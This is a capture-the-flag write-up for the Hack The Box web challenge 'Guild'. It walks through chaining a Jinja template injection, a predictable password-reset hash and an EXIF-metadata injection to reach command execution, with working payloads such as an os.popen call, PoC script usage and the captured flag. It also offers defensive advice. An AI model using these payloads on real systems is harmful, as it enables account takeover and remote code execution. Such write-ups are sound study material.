# Guild (Hack The Box) - Professional PoC Writeup

## Challenge Profile

| Field | Value |
|---|---|
| Challenge | Guild |
| Category | Web |
| Difficulty | Easy |
| Primary dropped file | `web_guild (1).zip` |
| Vulnerability chain | SSTI + predictable reset + EXIF SSTI |

## Scope And Ethics

This material is for authorized CTF infrastructure only. Do not run this PoC
against systems you do not own or have explicit permission to test.

## Technical Summary

The challenge is solved by chaining multiple weaknesses:
1. Profile share SSTI leaks internal admin email.
2. Password reset token is predictable as `sha256(email)`.
3. Admin-only verification flow renders EXIF `Artist` through Jinja, enabling command execution.

The final sink reads `flag.txt` and returns it in the verification response.

## Vulnerable Behavior

1. User-controlled bio is rendered through a template path with weak filtering.
2. Reset link design is deterministic and not secret-based.
3. Admin verification reads attacker-supplied EXIF metadata.
4. EXIF value reaches `render_template_string` without equivalent filtering.

## Manual Verification Steps

1. Register and login as normal user.
2. Upload benign verification image to unlock profile/share flow.
3. Set bio payload to leak admin email:

```text
{{User.query.filter_by(username='admin').first().email}}
```

4. Trigger forgot-password for leaked admin email.
5. Compute reset hash:

```text
sha256(admin_email)
```

6. Reset admin password via `/changepasswd/<hash>`.
7. Login as admin.
8. Upload image with EXIF `Artist` payload:

```text
{{lipsum.__globals__.os.popen('cat flag.txt').read()}}
```

9. Approve that verification request from `/admin`.
10. Extract `HTB{...}` from verify response.

## Automated PoC

Script:
`guild_poc.sh`

### Usage

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Guild"
chmod +x guild_poc.sh
./guild_poc.sh http://154.57.164.68:31870
```

### Common examples

```bash
./guild_poc.sh http://154.57.164.68:31870
./guild_poc.sh --host 154.57.164.68 --port 31870 --verbose
./guild_poc.sh --host 154.57.164.68 --port 31870 --json
```

## Options

- `--base-url <url>`: target URL including scheme.
- `--host <host>` + `--port <port>`: alternative target input.
- `--timeout <seconds>`: request timeout, default `20`.
- `--json`: machine-readable JSON output.
- `--verbose`: print debug details.
- `-h`, `--help`: show usage help.

## Exit Codes

- `0`: exploit chain succeeded and flag extracted.
- `2`: invalid CLI arguments.
- `3`: connectivity/request failure.
- `4`: exploit chain failed at logic stage.

## Why The Exploit Works

- Sensitive template context is exposed through user-influenced rendering.
- Account recovery logic is derived from public data.
- Privileged moderation functionality processes attacker-controlled metadata.
- Chaining small flaws bypasses intended role boundaries.

## Defensive Guidance

- Avoid rendering untrusted data in Jinja contexts.
- Use random, per-request, expiring reset tokens stored server-side.
- Treat image metadata as untrusted input.
- Apply strict authorization and server-side validation on admin workflows.

## Result Note

Flag values are instance-specific. The format remains `HTB{...}`.

## Final Flag

Target instance: `http://154.57.164.68:31870`  
Solved on: `2026-04-02`  
Flag: `HTB{mult1pl3_lo0p5_mult1pl3_h0les_f8ae9416479520f17bf554b53fd349d3}`
